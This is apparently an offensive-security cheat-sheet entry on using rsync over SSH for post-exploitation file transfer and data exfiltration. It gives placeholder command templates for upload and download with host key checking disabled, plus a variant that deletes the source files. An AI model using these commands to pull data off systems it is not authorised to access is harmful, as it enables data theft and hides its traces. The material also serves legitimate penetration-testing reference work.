---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - ssh
  - linux
---
# Rsync

> [!IMPORTANT] Conditions
> The SSH server must have [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Ports/Rsync|`rsync`]] installed.

## 01 - Upload

```
$ rsync -r[v]huPze "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <file_source> <username>@<IP>:<file_destination>
```

> [!CAUTION]
> `--remove-source-files` flag will remove the files from the source directory. Think of it as moving all the data to the destination then cleans up the source.

```
$ rsync --remove-source-files -r[v]huPze "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <file_source> <username>@<IP>:<file_destination>
```

## 02 - Download

```
$ rsync -r[v]huzPe "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <username>@<IP>:<file_source> <file_destination>
```

---
## References

### Source Repository

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)